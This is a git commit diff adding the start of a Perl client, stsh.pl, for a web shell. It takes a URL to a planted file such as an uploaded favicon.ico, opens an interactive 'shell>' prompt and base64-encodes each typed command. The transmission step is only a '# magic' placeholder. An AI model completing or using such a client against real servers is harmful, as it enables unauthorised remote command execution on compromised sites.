cac2be314182d8a121868d19d1ed6271583bc029
Eldar Marcussen <wireghoul@justanotherhacker.com>
2012-01-31 13:37:39 +1100

    Tease #2

--- stsh.pl
+++ stsh.pl
@@ -5,7 +5,23 @@
 use warnings;
 use strict;
 use MIME::Base64;
+use LWP::UserAgent;
+
+&usage unless $ARGV[0];
+my $url = $ARGV[0];
+pop(@ARGV); #keep readline happy
+my $ua = LWP::UserAgent->new;
 
 sub usage {
     print "Usage: $0 url\nExample: $0 http://vuln.com/upload/favicon.ico\n";
+    exit 2;
+}
+
+my $cmd = ''; my $b64;
+until ($cmd eq 'exit') {
+  print "shell> ";
+  $cmd = readline;
+  chomp $cmd;
+  $b64 = encode_base64($cmd);
+  # magic    
 }
